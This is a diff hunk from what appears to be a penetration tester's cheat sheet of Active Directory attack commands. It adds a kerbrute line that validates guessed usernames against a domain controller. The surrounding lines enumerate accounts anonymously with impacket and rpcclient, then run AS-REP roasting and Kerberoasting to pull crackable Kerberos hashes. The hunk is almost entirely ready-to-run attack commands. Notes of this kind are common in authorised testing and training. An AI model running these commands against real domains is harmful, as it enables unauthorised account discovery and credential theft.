@@ -152,6 +152,7 @@ smbnull -i $TARGET
 impacket-lookupsid 'anonymous'@$TARGET 10000 -no-pass | cut -d '\' -f 2 | grep 'SidTypeUser' | cut -d ' ' -f 1 | tr '[:upper:]' '[:lower:]' | tee usernames
 rpcclient -U "" -N $TARGET -c "enumdomusers" | grep -oP 'user:\[\K[^]]+' | tr '[:upper:]' '[:lower:]' | tee usernames
 (kerbrute userenum --dc $TARGET -d $DOM /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 50 --delay 0 -o $TARGET_userenum.kerbrute &)
+kerbrute userenum --dc $TARGET -d $DOM usernames -t 50 --delay 0 | grep 'VALID' | rev | cut -d ':' -f1 | rev | cut -d '@' -f1 | xargs -n1 > .tmp; cat .tmp | tee usernames; rm .tmp
 cat *.kerbrute | grep '[+]' | cut -d ':' -f4 | cut -d '@' -f1 | xargs -n1 | tr '[:upper:]' '[:lower:]' | sort -u | tee usernames
 impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -usersfile usernames
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -no-preauth 'NPUserjjones' -usersfile usernames
